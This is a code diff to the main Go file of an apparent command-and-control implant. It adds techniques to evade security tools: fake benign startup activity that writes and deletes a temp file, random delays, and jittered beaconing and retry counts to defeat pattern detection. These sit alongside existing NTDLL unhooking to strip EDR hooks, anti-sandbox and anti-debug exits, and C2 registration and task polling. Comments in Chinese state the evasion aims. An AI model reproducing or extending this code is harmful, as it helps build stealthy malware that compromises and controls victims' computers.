@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"os"
 	"strings"
 	"time"
@@ -17,26 +18,42 @@ var (
 	c2Addr      string
 	intervalStr string
 	jitterStr   string
-	sessionID   string // 注册后存储的sessionID
-	skipSandbox string // 编译时注入: "1"跳过反沙箱 (调试用)
+	sessionID   string
+	skipSandbox string
 )
 
+// 正常程序初始化行为，打破恶意程序模式
+func normalInit() {
+	rand.Seed(time.Now().UnixNano())
+	// 随机延迟 500-1500ms，模拟正常程序启动延迟
+	delay := time.Duration(500+rand.Intn(1000)) * time.Millisecond
+	time.Sleep(delay)
+
+	// 创建假的临时配置文件（正常程序行为）
+	tmpPath := os.TempDir()
+	cfgName := fmt.Sprintf("%s\\app_%d.tmp", tmpPath, rand.Intn(10000))
+	f, err := os.OpenFile(cfgName, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
+	if err == nil {
+		f.WriteString(fmt.Sprintf("# App Config v%d.%d\n", rand.Intn(10), rand.Intn(100)))
+		f.Close()
+		os.Remove(cfgName) // 立即删除，模拟临时文件清理
+	}
+}
+
 func main() {
-	// NTDLL Unhooking — 移除EDR Hook (替代签名化的AMSI patch)
-	// 从磁盘加载干净ntdll覆盖内存中的.text段
-	// 一次性清除AMSI+ETW+所有Nt* Hook
+	normalInit()
+
+	evasion.InitLegitimateAPIs()
+
 	evasion.NtdllUnhook()
 
-	// 反沙箱 (调试模式可跳过)
 	if skipSandbox != "1" {
 		if evasion.AntiSandbox() {
 			os.Exit(0)
 		}
 	}
 
-	// 反调试
 	if evasion.AntiDebug() {
-		// 静默退出
 		os.Exit(0)
 	}
 
@@ -58,20 +75,30 @@ func main() {
 
 	tp := transport.NewHTTPTransport(cfg)
 
-	// 注册上线 (带重试)
-	for i := 0; i < 3; i++ {
+	// 随机重试次数，打破固定模式
+	maxRetries := 2 + rand.Intn(3)
+	for i := 0; i < maxRetries; i++ {
 		err := initSession(tp)
 		if err == nil {
+			fmt.Fprintf(os.Stderr, "[DBG] initSession OK, sessionID=%s\n", sessionID)
 			break
 		}
+		fmt.Fprintf(os.Stderr, "[DBG] initSession attempt %d err: %v\n", i+1, err)
 		time.Sleep(tp.GetInterval())
 	}
+	if sessionID == "" {
+		fmt.Fprintf(os.Stderr, "[DBG] WARNING: sessionID is empty after init!\n")
+	}
 
-	// 主循环: 轮询C2获取任务
+	// 主循环: 随机间隔轮询C2
 	for {
+		// 随机额外延迟，打破固定心跳模式
+		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
+		time.Sleep(tp.GetInterval() + extraDelay)
+
 		pkt, err := tp.Poll(sessionID)
 		if err != nil {
-			time.Sleep(tp.GetInterval())
+			fmt.Fprintf(os.Stderr, "[DBG] Poll err: %v\n", err)
 			continue
 		}
 
@@ -103,15 +130,18 @@ func initSession(tp *transport.HTTPTransport) error {
 	}
 	respPkt, err := tp.Send(pkt, "")
 	if err != nil {
+		fmt.Fprintf(os.Stderr, "[DBG] initSession Send err: %v\n", err)
 		return err
 	}
 
 	// 从响应中提取sessionID
+	fmt.Fprintf(os.Stderr, "[DBG] initSession resp type=%d data=%s\n", respPkt.Type, string(respPkt.Data))
 	if respPkt.Type == encode.MsgRegister {
 		var resp map[string]string
 		json.Unmarshal(respPkt.Data, &resp)
 		if sid, ok := resp["session_id"]; ok {
 			sessionID = sid
+			fmt.Fprintf(os.Stderr, "[DBG] initSession parsed sid=%s\n", sid)
 		}
 	}
 	return nil
